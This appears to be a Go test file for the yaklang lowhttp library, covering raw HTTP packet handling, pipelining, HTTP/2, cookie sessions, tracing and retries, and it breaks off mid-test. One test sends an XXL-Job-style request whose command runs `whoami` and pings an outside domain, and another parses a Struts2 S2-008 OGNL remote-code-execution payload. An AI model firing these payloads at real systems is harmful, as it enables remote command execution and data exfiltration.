package lowhttp

import (
	"bytes"
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/davecgh/go-spew/spew"
	"github.com/google/uuid"
	"github.com/stretchr/testify/require"
	"github.com/yaklang/yaklang/common/netx"
	"golang.org/x/net/http2"

	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"

	_ "github.com/yaklang/yaklang/common/utils/tlsutils"
)

func TestLowhttp_Pipeline_AutoFix(t *testing.T) {
	count := 0
	host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		count++
		writer.Write([]byte("ab"))
	})
	var packet = `GET / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
Content-Length: 1

aGET / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
Content-Length: 2

aa`
	rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second))
	if err != nil {
		t.Fatal(err)
	}
	fmt.Println(string(rsp.RawPacket))
	fmt.Println("------------------------------")
	fmt.Println(string(rsp.RawRequest))
	if strings.Count(string(rsp.RawPacket), `HTTP/1.1 200 OK`) != 2 && count == 2 {
		t.Fatal("BUG: Pipeline failed")
	}

	packet = `GET / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
Content-Length: 2

aGET / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
Content-Length: 2

aa`
	rsp, err = HTTP(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second))
	if err != nil {
		t.Fatal(err)
	}
	fmt.Println(string(rsp.RawPacket))
	fmt.Println("------------------------------")
	fmt.Println(string(rsp.RawRequest))
	if strings.Count(string(rsp.RawPacket), `HTTP/1.1 200 OK`) != 1 && count == 3 {
		t.Fatal("BUG: Pipeline failed")
	}
}

func TestLowhttp_Pipeline_AutoFix2(t *testing.T) {
	count := 0
	host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		count++
		writer.Write([]byte("ab"))
	})
	var packet = `POST /run HTTP/1.1
Host: www.example.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Content-Type: application/json
Content-Length: 1

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "ping ` + "`" + `whoami` + "`" + `.jscaojctxy.dgrh3.cn",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}`
	rsp, err := HTTP(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second), WithHost(host), WithPort(port))
	if err != nil {
		t.Fatal(err)
	}
	fmt.Println(string(rsp.RawPacket))
	fmt.Println("------------------------------")
	fmt.Println(string(rsp.RawRequest))

	if count != 1 {
		t.Fatal("BUG: Pipeline failed")
	}
}

func TestLowhttpResponse2(t *testing.T) {
	host, port, _ := utils.ParseStringToHostPort("https://pie.dev")
	packet := `GET /delay/2 HTTP/1.1
Host: ` + utils.HostPort(host, port)

	response, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte(packet)), WithHttps(true))
	if err != nil {
		log.Error(err)
		t.Fatal("BUG: httptest server failed")
	}

	rsp := response.RawPacket
	if !bytes.HasPrefix(rsp, []byte("HTTP/")) {
		t.Fatalf("Response not startswith 'HTTP/': %s", string(rsp))
	}
	if !bytes.Contains(rsp, []byte("200 OK")) {
		t.Fatalf("Response statuscode != 200: %s", string(rsp))
	}
	serverTime := response.TraceInfo.ServerTime
	if serverTime >= 2000*time.Millisecond {
		t.Logf("ConnectionTime: %s", response.TraceInfo.ConnTime)
		t.Logf("ServerTime: %s", serverTime)
		t.Logf("TotalTime: %s", response.TraceInfo.TotalTime)
		t.Logf("Response: %s", string(rsp))
	} else {
		t.Fatalf("ServerTime in 2 to 2.5s: %s", response.TraceInfo.ServerTime)
	}
}

func TestLowhttpResponse(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		time.Sleep(1 * time.Second)
		writer.Write([]byte("hello"))
	}))
	time.Sleep(time.Second)

	host, port, _ := utils.ParseStringToHostPort(server.URL)
	packet := `GET / HTTP/1.1
Host: ` + utils.HostPort(host, port)

	start := time.Now()
	response, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true))
	if err != nil {
		log.Error(err)
		t.Fatal("BUG: httptest server failed")
	}
	totalTime := time.Since(start)

	rsp := response.RawPacket
	if !bytes.Contains(rsp, []byte("hello")) {
		t.Fatalf("Response != 'hello': %s", string(rsp))
	}
	serverTime := response.TraceInfo.ServerTime

	if serverTime >= 1000*time.Millisecond && serverTime <= 1100*time.Millisecond {
		t.Logf("ConnectionTime: %s", response.TraceInfo.ConnTime)
		t.Logf("ServerTime: %s", serverTime)
		t.Logf("TotalTime: %s", totalTime)
	} else {
		t.Fatalf("ServerTime in 1 to 1.1s: %s", response.TraceInfo.ServerTime)
	}
}

func TestPocSession(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		header := writer.Header()
		if strings.Contains(request.URL.String(), "name1/value1") {
			header.Add("Set-Cookie", "name1=value1")
		}
	}))
	time.Sleep(time.Second)

	host, port, _ := utils.ParseStringToHostPort(server.URL)
	packet := `GET /cookies/set/name1/value1 HTTP/1.1
Host: ` + utils.HostPort(host, port)

	// same session
	response, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true), WithSession("test"))
	rsp := response.RawPacket
	if err != nil {
		log.Error(err)
		panic("BUG: httptest server failed")
	}

	if !strings.Contains(string(rsp), "Set-Cookie:") {
		panic("No Cookie Set")
	}

	// check request
	var req []byte
	response, err = HTTP(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true), WithSession("test"),
		WithBeforeDoRequest(func(bytes []byte) []byte {
			req = bytes
			return bytes
		}),
	)
	rsp = response.RawPacket

	if err != nil {
		panic("BUG: httptest server failed")
	}
	println(string(req))
	if !strings.Contains(string(req), "name1=value1") {
		panic("request no cookie name1=value1")
	}

	// check request
	response, err = HTTP(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true), WithSession("abc"),
		WithBeforeDoRequest(func(bytes []byte) []byte {
			req = bytes
			return bytes
		}),
	)
	rsp = response.RawPacket

	if err != nil {
		panic("BUG: httptest server failed")
	}
	println(string(req))
	if strings.Contains(string(req), "name1=value1") {
		panic("request(session test1) has cookie name1=value1")
	}
}

func TestPoCS2008(t *testing.T) {
	req := FixHTTPPacketCRLF([]byte(`GET /devmode.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char[50000]%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close() HTTP/1.1
Host: cybertunnel.run:8080
`), false)
	url, err := ExtractURLFromHTTPRequestRaw(req, false)
	if err != nil {
		panic(err)
	}
	if url.String() != "http://cybertunnel.run:8080/devmode.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char[50000]%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()" {
		panic(1)
	}
}

func TestPoCH2(t *testing.T) {
	addr := utils.HostPort("127.0.0.1", utils.GetRandomAvailableTCPPort())
	var buf bytes.Buffer
	go func() {
		lis, err := net.Listen("tcp", addr)
		if err != nil {
			panic(err)
		}
		conn, err := lis.Accept()
		if err != nil {
			return
		}
		go func() {
			select {
			case <-time.After(500 * time.Millisecond):
				conn.Close()
			}
		}()
		io.Copy(&buf, conn)
	}()
	time.Sleep(500 * time.Millisecond)
	nConn, err := net.Dial("tcp", addr)
	if err != nil {
		panic(err)
	}
	HTTPRequestToHTTP2("https", addr, nConn, []byte(`GET / HTTP/2.0
Host: www.example.com
User-Agent: adsfhasdhjksddjklakospdf


asdfijkoasdfjkasdf
dfasdfasdf
asd
fa
sdf
asd
f
asdf
asd`), false)
	if !strings.HasPrefix(buf.String(), `PRI * HTTP/2.0`) && len(buf.String()) > 120 {
		panic("HTTP2 not ready")
	}
}

func TestLowhttpTraceInfo_GetServerDurationMS(t *testing.T) {
	server, port := utils.DebugMockHTTP([]byte(`HTTP/1.1 200 OK
Content-Length: 11

asdfas
dfa
sdf
asdf
asdf`))
	_ = server
	rsp, err := HTTP(
		WithPacketBytes([]byte(`GET / HTTP/1.1
Host: www.baidu.com

`)), WithETCHosts(map[string]string{"www.baidu.com": "127.0.0.1"}), WithPort(port))
	if err != nil {
		panic(err)
	}
	_ = rsp
	if !bytes.Contains(rsp.RawPacket, []byte("dfa")) {
		panic(1)
	}

	rsp, err = HTTP(
		WithPacketBytes([]byte(`GET / HTTP/1.1
Host: ccc

`)), WithETCHosts(map[string]string{"www.baidu.com": "127.0.0.1", "ccc": "127.0.0.1"}), WithPort(port))
	if err != nil {
		panic(err)
	}
	_ = rsp
	if !bytes.Contains(rsp.RawPacket, []byte("dfa")) {
		panic(1)
	}
}

func TestParsePacketTOURLCase1(t *testing.T) {
	u, err := ExtractURLFromHTTPRequestRaw([]byte(`GET /abc HTTP/1.1
Host: baidu.com`), false)
	if err != nil {
		panic(err)
	}
	if u.String() != "http://baidu.com/abc" {
		t.Fatal("BUG: Packet to URL FAILED")
	}
}

func TestParsePacketTOURLCase2(t *testing.T) {
	u, err := ExtractURLFromHTTPRequestRaw([]byte(`GET baidu.com/abc HTTP/1.1
Host: baidu.com`), false)
	if err != nil {
		panic(err)
	}
	if u.String() != "http://baidu.com/baidu.com/abc" {
		t.Fatal("BUG: Packet to URL FAILED")
	}
}

func TestParsePacketTOURLCase3(t *testing.T) {
	u, err := ExtractURLFromHTTPRequestRaw([]byte(`GET http://www.baidu.com/abc HTTP/1.1
Host: baidu.com`), false)
	if err != nil {
		panic(err)
	}
	if u.String() != "http://www.baidu.com/abc" {
		t.Fatal("BUG: Packet to URL FAILED")
	}
}

func TestParsePacketTOURLCase4(t *testing.T) {
	u, err := ExtractURLFromHTTPRequestRaw([]byte(`GET http://www.baidu.com/abc HTTP/1.1
Host: www.baidu.com`), false)
	if err != nil {
		panic(err)
	}
	if u.String() != "http://www.baidu.com/abc" {
		t.Fatal("BUG: Packet to URL FAILED")
	}
}

func TestParsePacketTOURLCase5(t *testing.T) {
	req, err := utils.ReadHTTPRequestFromBytes([]byte(`GET http://www.baidu.com/abc HTTP/1.1
Host: www.baidu.com`))
	if err != nil {
		panic(err)
	}
	u, err := ExtractURLFromHTTPRequest(req, false)
	if err != nil {
		panic(err)
	}
	if u.String() != "http://www.baidu.com/abc" {
		t.Fatal("BUG: Packet to URL FAILED")
	}
}

func TestParsePacketTOURLCase6(t *testing.T) {
	u, err := ExtractURLFromHTTPRequestRaw([]byte(`GET ws://82.157.123.54:9010/ajaxchattest HTTP/1.1
Host: 82.157.123.54:9010
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Upgrade: websocket
Origin: http://coolaf.com
Sec-WebSocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6
Sec-WebSocket-Key: 6cXeWYUxVq5hawwy2Vhsrw==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits`), false)
	if err != nil {
		panic(err)
	}
	if u.String() != "ws://82.157.123.54:9010/ajaxchattest" {
		t.Fatal("BUG: Packet to URL FAILED")
	}
}

func TestLowhttp_HTTP_close_readBody(t *testing.T) {
	var ctx, cancel = context.WithCancel(utils.TimeoutContextSeconds(5))
	defer cancel()

	thisTest := func() {
		host, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\nConnection: close\r\n\r\n" + strings.Repeat("a", 4096)))
		var packet = `GET / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
`
		rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte(packet)), WithTimeout(2*time.Second))
		if err != nil {
			t.Fatal(err)
		}
		fmt.Println(string(rsp.RawPacket))
		fmt.Println("------------------------------")
		fmt.Println(string(rsp.RawRequest))
		if !bytes.Contains(rsp.RawPacket, bytes.Repeat([]byte("a"), 4096)) {
			t.Fatal("read Connection close resp error")
		}
	}

	err := utils.CallWithCtx(ctx, thisTest)
	if err != nil {
		t.Fatal(err)
	}

}

func TestLowhttp_HTTP_ProxyTimeout(t *testing.T) {
	proxyUrl := fmt.Sprintf("http://%s", utils.HostPort(utils.DebugMockHTTPKeepAliveEx(func(req []byte) []byte {
		r, _ := ParseBytesToHttpRequest(req)
		if r.Method == "CONNECT" {
			return []byte("HTTP/1.0 200 Connection established\r\n\r\n")
		}
		return []byte("HTTP/1.1 200 OK\r\nContent-Length: 1\r\n\r\na")
	})))

	_, err := HTTPWithoutRedirect(WithProxy(proxyUrl), WithConnectTimeout(3*time.Second), WithConnPool(true), WithPacketBytes([]byte("GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n")))
	if err != nil {
		panic(err)
	}
	time.Sleep(5 * time.Second)
	_, err = HTTPWithoutRedirect(WithProxy(proxyUrl), WithConnectTimeout(3*time.Second), WithConnPool(true), WithPacketBytes([]byte("GET / HTTP/1.1\r\nHost: www.baidu.com\r\n\r\n")))
	if err != nil {
		panic(err)
	}

}

func TestLowhttp_RESP_WithoutContentLength_WithContent(t *testing.T) {
	target := utils.HostPort(utils.DebugMockTCPEx(func(ctx context.Context, lis net.Listener, conn net.Conn) {
		conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nX-Content-Type-Options: nosniff\r\n\r\n"))
		time.Sleep(50 * time.Millisecond)
		conn.Write([]byte("abcd"))
	}))
	rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n")))
	if err != nil {
		panic(err)
	}
	if !bytes.Contains(rsp.RawPacket, []byte("abcd")) {
		panic("Response has content")
	}
}

func TestLowhttp_RESP_StreamBody(t *testing.T) {
	target := utils.HostPort(utils.DebugMockTCPEx(func(ctx context.Context, lis net.Listener, conn net.Conn) {
		conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 16\r\nX-Content-Type-Options: nosniff\r\n\r\n"))
		time.Sleep(200 * time.Millisecond)
		conn.Write([]byte("abcd"))
		time.Sleep(200 * time.Millisecond)
		conn.Write([]byte("abcd"))
		time.Sleep(200 * time.Millisecond)
		conn.Write([]byte("abcd"))
		conn.Write([]byte("abcd"))
		conn.Write([]byte("abcd"))
		log.Info("start to close stream")
		conn.Close()
	}))

	var results []byte
	var timePassed bool
	wg := utils.NewSizedWaitGroup(1)
	wg.Add(1)
	_, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte("GET / HTTP/1.1\r\nHost: "+target+"\r\n\r\n")),
		WithBodyStreamReaderHandler(func(response []byte, closer io.ReadCloser) {
			defer wg.Done()

			log.Info("start to handle closer")
			start := time.Now()
			all, _ := io.ReadAll(closer)
			log.Info("finished")
			results = all
			end := time.Now()
			if ret := end.Sub(start).Milliseconds(); ret > 500 && 700 > ret {
				timePassed = true
			} else {
				spew.Dump(end.Sub(start))
			}
		}),
	)
	if err != nil {
		panic(err)
	}

	log.Info("start to wait stream")
	wg.Wait()
	if !timePassed {
		t.Fatal("time not right")
	}
	spew.Dump(results)
	if !bytes.Contains(results, []byte("abcdabcdabcdabcd")) {
		panic("Response has content")
	}
}

func TestLowhttp_HTTP_Cookie_Session(t *testing.T) {
	host, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\nSet-Cookie: a=b; path=/\r\n\r\n"))
	var packet = `GET / HTTP/1.1
Host: ` + utils.HostPort(host, port) + `
`
	_, err := HTTPWithoutRedirect(WithPacketBytes([]byte(packet)), WithSession("test"))
	require.NoError(t, err)

	rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte(packet)), WithSession("test"))
	require.NoError(t, err)
	require.Equal(t, "a=b", GetHTTPPacketHeader(rsp.RawRequest, "Cookie"))

	rsp, err = HTTPWithoutRedirect(WithPacketBytes(ReplaceHTTPPacketCookie(rsp.RawRequest, "a", "c")), WithSession("test"))
	require.NoError(t, err)
	require.Equal(t, "a=c;", GetHTTPPacketHeader(rsp.RawRequest, "Cookie"))
}

func TestPoCH2Preface(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 40*time.Second)
	token := uuid.NewString()
	host, port := utils.DebugMockHTTP2(ctx, func(req []byte) []byte {
		return []byte(token)
	})

	middlewarePort := utils.GetRandomAvailableTCPPort()
	tlsConfig := utils.GetDefaultTLSConfig(5)
	copied := *tlsConfig
	copied.NextProtos = []string{"h2"}
	listen, err := tls.Listen("tcp", utils.HostPort(host, middlewarePort), &copied)
	require.NoError(t, err)

	go func() {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := listen.Accept()
			if err != nil {
				return
			}
			go func() {
				clientConn := conn
				defer clientConn.Close()
				serverConn, err := netx.DialX(utils.HostPort(host, port), netx.DialX_WithTLS(true), netx.DialX_WithTLSNextProto("h2"))
				if err != nil {
					return
				}
				defer serverConn.Close()
				middlewareReader, middlewareWriter := utils.NewBufPipe(nil)
				_ = middlewareReader
				copyReader := io.TeeReader(clientConn, middlewareWriter)
				go func() {
					io.Copy(serverConn, copyReader)
				}()

				buf := make([]byte, len(http2.ClientPreface)) // trim client preface
				if _, err := io.ReadFull(middlewareReader, buf); err != nil {
					cancel()
				}
				frameReader := http2.NewFramer(nil, middlewareReader)
				for {
					frame, err := frameReader.ReadFrame()
					if err != nil && !errors.Is(err, io.EOF) {
						return
					}
					if _, ok := frame.(*http2.HeadersFrame); ok {
						io.Copy(clientConn, serverConn)
						return
					}
				}

			}()

		}
	}()

	rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte("GET / HTTP/2.0\r\nHost: "+utils.HostPort(host, middlewarePort)+"\r\nContent-Length: 1\r\n\r\na")), WithHttp2(true), WithHttps(true))
	require.NoError(t, err)
	require.Contains(t, string(rsp.RawPacket), token)

}

func TestLowhttpTraceInfo(t *testing.T) {
	httpsHost, httpsPort := utils.DebugMockHTTPS([]byte("HTTP/1.1 200 OK\r\n" +
		"Content-Length: 1\r\n\r\n"))
	t.Run("https", func(t *testing.T) {
		rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte(fmt.Sprintf(`GET / HTTP/1.1
Host: %v 

`, utils.HostPort(httpsHost, httpsPort)))), WithHttps(true))
		require.NoError(t, err)

		traceInfo := rsp.TraceInfo
		require.Greater(t, traceInfo.TLSHandshakeTime.Nanoseconds(), int64(0))
		require.GreaterOrEqual(t, traceInfo.ConnTime.Nanoseconds(), int64(0))

	})

}

func TestLowhttpH2Downgrade(t *testing.T) {
	count := 100
	if utils.InGithubActions() {
		count = 4
	}
	swg := utils.NewSizedWaitGroup(1)
	for i := 0; i < count; i++ {
		swg.Add(1)
		httpsHost, httpsPort := utils.DebugMockHTTPS([]byte("HTTP/1.1 200 OK\r\n" +
			"Content-Length: 1\r\n\r\na"))
		go func() {
			defer swg.Done()

			t.Run("http2 Downgrade http1", func(t *testing.T) {
				rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte(fmt.Sprintf(`GET / HTTP/2
Host: %v 

`, utils.HostPort(httpsHost, httpsPort)))), WithHttps(true), WithConnPool(false))
				spew.Dump(rsp.RawPacket)
				require.NoError(t, err)
			})
		}()
	}
	swg.Wait()
}

func TestLowhttpH2TraceInfo(t *testing.T) {
	ctx := utils.TimeoutContext(10 * time.Second)
	count := 4
	if utils.InGithubActions() {
		count = 4
	}
	swg := utils.NewSizedWaitGroup(1)
	for i := 0; i < count; i++ {
		swg.Add(1)
		httpsHost, httpsPort := utils.DebugMockHTTP2(ctx, func(req []byte) []byte {
			time.Sleep(50 * time.Millisecond)
			return req
		})
		go func() {
			defer swg.Done()

			t.Run("http2 trace info check", func(t *testing.T) {
				rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte(fmt.Sprintf(`GET / HTTP/2
Host: %v 

`, utils.HostPort(httpsHost, httpsPort)))), WithHttps(true), WithConnPool(false))
				require.NoError(t, err)
				spew.Dump(rsp.RawPacket)
				require.NotNilf(t, rsp.TraceInfo, "TraceInfo should not be nil")
				require.Greater(t, rsp.TraceInfo.ServerTime.Nanoseconds(), int64(0))
			})
		}()
	}
	swg.Wait()
}

func TestLowhttpH2Downgrade_NG(t *testing.T) {
	count := 10
	if utils.InGithubActions() {
		count = 3
	}
	swg := utils.NewSizedWaitGroup(100)
	for i := 0; i < count; i++ {
		swg.Add(1)
		httpsHost, httpsPort := utils.DebugMockHTTPS([]byte("HTTP/1.1 200 OK\r\n" +
			"Content-Length: 1\r\n\r\na"))
		go func() {
			defer swg.Done()

			t.Run("ng http1.1 to http1.1 stable", func(t *testing.T) {
				rsp, err := HTTPWithoutRedirect(WithPacketBytes([]byte(fmt.Sprintf(`GET / HTTP/1.1
Host: %v 

`, utils.HostPort(httpsHost, httpsPort)))), WithHttps(true), WithConnPool(false))
				require.Greater(t, len(rsp.RawPacket), int(0))
				require.NoError(t, err)
			})
		}()
	}
	swg.Wait()
}

func TestLowhttp_conn_pool_deformity(t *testing.T) {
	token := utils.RandStringBytes(10)
	server, port := utils.DebugMockHTTP([]byte(fmt.Sprintf(`
HTTP/1.1 200 OK
Content-Length: 10

%s
`, token)))
	rsp, err := HTTP(
		WithPacketBytes([]byte(`GET / HTTP/1.1
Host: `+utils.HostPort(server, port)+`

`)), WithConnPool(true))
	require.NoError(t, err)
	require.Contains(t, string(rsp.RawPacket), token)

}

func TestWithStreamHandler(t *testing.T) {
	host, port := utils.DebugMockHTTP([]byte("HTTP/1.1 200 OK\r\nServer: nginx\r\n\r\n"))
	if utils.WaitConnect(utils.HostPort(host, port), 3) != nil {
		t.Fatal("debug server failed")
	}
	called := false
	responseChecked := false

	c := new(int64)
	add := func() {
		atomic.AddInt64(c, 1)
	}
	get := func() int64 {
		return atomic.LoadInt64(c)
	}

	HTTP(WithPacketBytes([]byte(`GET / HTTP/1.1
Host: `+utils.HostPort(host, port)+"\r\n\r\n")), WithBodyStreamReaderHandler(func(i []byte, closer io.ReadCloser) {
		add()
		fmt.Println(string(i))
		if bytes.Contains(i, []byte("Server: nginx")) {
			responseChecked = true
		}
		called = true
	}))
	require.True(t, called)
	require.True(t, responseChecked)
	require.Equal(t, get(), int64(1))
}

func TestWithStreamHandler_BAD(t *testing.T) {
	host, port := utils.DebugMockHTTPS([]byte("HTTP/1.1 200 OK\r\nServer: nginx\r\n\r\n"))
	if utils.WaitConnect(utils.HostPort(host, port), 3) != nil {
		t.Fatal("debug server failed")
	}
	called := false
	responseChecked := false
	c := new(int64)
	add := func() {
		atomic.AddInt64(c, int64(1))
	}
	get := func() int64 {
		return atomic.LoadInt64(c)
	}
	HTTP(WithPacketBytes([]byte(`GET / HTTP/1.1
Host: `+utils.HostPort(host, port)+"\r\n\r\n")), WithBodyStreamReaderHandler(func(i []byte, closer io.ReadCloser) {
		add()
		if bytes.Contains(i, []byte("Server: nginx")) {
			responseChecked = true
		}
		called = true
	}))
	require.True(t, called)
	require.False(t, responseChecked)
	require.Equal(t, int64(1), get())
}

func TestWithStreamHandler_BAD2(t *testing.T) {
	testPassed := false

	for i := 0; i < 5; i++ {
		log.Infof("Running test iteration %d", i)

		requested := false
		host, port := utils.DebugMockHTTPHandlerFunc(func(writer http.ResponseWriter, r *http.Request) {
			requested = true
			time.Sleep(2 * time.Second)
		})

		if utils.WaitConnect(utils.HostPort(host, port), 3) != nil {
			log.Errorf("debug server failed in iteration %d", i)
			continue
		}

		called := false
		responseChecked := false
		c := new(int64)
		add := func() {
			atomic.AddInt64(c, 1)
		}
		get := func() int64 {
			return atomic.LoadInt64(c)
		}

		HTTP(WithTimeoutFloat(0.2), WithPacketBytes([]byte(`GET / HTTP/1.1
Host: `+utils.HostPort(host, port)+"\r\n\r\n")), WithBodyStreamReaderHandler(func(i []byte, closer io.ReadCloser) {
			fmt.Println(string(i))
			add()
			if bytes.Contains(i, []byte("Server: nginx")) {
				responseChecked = true
			}
			called = true
		}))

		// 检查这次测试是否通过
		if called && requested && get() == int64(1) && !responseChecked {
			testPassed = true
			log.Infof("Test passed in iteration %d", i)
			break
		}
	}

	// 只要有一次测试通过就算通过
	require.True(t, testPassed, "Test failed in all 5 iterations")
}

func TestHTTP_RetryWithStatusCode(t *testing.T) {
	flag := utils.RandStringBytes(100)

	t.Run("not in statuscode", func(t *testing.T) {
		count := 0
		host, port := utils.DebugMockHTTPEx(func(req []byte) []byte {
			count++
			if count < 3 {
				return []byte("HTTP/1.1 403 Forbidden\r\nServer: nginx\r\n\r\n")
			}
			return []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", len(flag), flag))
		})

		hostport := utils.HostPort(host, port)
		packet := `GET / HTTP/1.1
Host: ` + hostport + `
User-Agent: yaklang-test/1.0

`

		rsp, err := HTTP(WithPacketBytes(
			[]byte(packet)),
			WithTimeout(3*time.Second),
			WithRetryWaitTime(100*time.Millisecond),
			WithRetryNotInStatusCode([]int{200}),
			WithRetryTimes(10),
		)
		require.NoError(t, err)
		require.Equal(t, count, 3, "server should be called at 3 times")
		require.True(t, strings.Contains(string(rsp.RawPacket), string(flag)), "final response should contain the flag")

	})

	t.Run("in statuscode", func(t *testing.T) {
		count := 0
		host, port := utils.DebugMockHTTPEx(func(req []byte) []byte {
			count++
			if count < 3 {
				return []byte("HTTP/1.1 403 Forbidden\r\nServer: nginx\r\n\r\n")
			}
			return []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", len(flag), flag))
		})

		hostport := utils.HostPort(host, port)
		packet := `GET / HTTP/1.1
Host: ` + hostport + `
User-Agent: yaklang-test/1.0

`

		rsp, err := HTTP(WithPacketBytes(
			[]byte(packet)),
			WithTimeout(3*time.Second),
			WithRetryWaitTime(100*time.Millisecond),
			WithRetryInStatusCode([]int{403}),
			WithRetryTimes(10),
		)
		require.NoError(t, err)
		require.Equal(t, count, 3, "server should be called at 3 times")
		require.True(t, strings.Contains(string(rsp.RawPacket), string(flag)), "final response should contain the flag")

	})

	t.Run("statuscode", func(t *testing.T) {
		count := 0
		host, port := utils.DebugMockHTTPEx(func(req []byte) []byte {
			count++
			if count < 3 {
				return []byte("HTTP/1.1 403 Forbidden\r\nServer: nginx\r\n\r\n")
			}
			if count < 6 {
				return []byte("HTTP/1.1 500 Internal Server Error\r\nServer: nginx\r\n\r\n")
			}

			return []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", len(flag), flag))
		})

		hostport := utils.HostPort(host, port)
		packet := `GET / HTTP/1.1
Host: ` + hostport + `
User-Agent: yaklang-test/1.0

`

		rsp, err := HTTP(WithPacketBytes(
			[]byte(packet)),
			WithTimeout(3*time.Second),
			WithRetryWaitTime(100*time.Millisecond),
			WithRetryNotInStatusCode([]int{500, 200}),
			WithRetryInStatusCode([]int{500}),
			WithRetryTimes(10),
		)
		require.NoError(t, err)
		require.Equal(t, count, 6, "server should be called at 6 times")
		require.True(t, strings.Contains(string(rsp.RawPacket), string(flag)), "final response should contain the flag")

	})

	t.Run("h2 statuscode", func(t *testing.T) {
		count := 0
		ctx := utils.TimeoutContext(5 * time.Second)
		host, port := utils.DebugMockHTTP2HandlerFuncContext(ctx, func(writer http.ResponseWriter, request *http.Request) {
			count++
			if count < 3 {
				writer.WriteHeader(403)
				return
			}
			if count < 6 {
				writer.WriteHeader(500)
				return
			}
			writer.WriteHeader(200)
			writer.Write([]byte(flag))
			return
		})

		hostport := utils.HostPort(host, port)
		packet := `GET / HTTP/2
Host: ` + hostport + `
User-Agent: yaklang-test/1.0

`

		rsp, err := HTTP(WithPacketBytes(
			[]byte(packet)),
			WithTimeout(3*time.Second),
			WithHttp2(true),
			WithHttps(true),
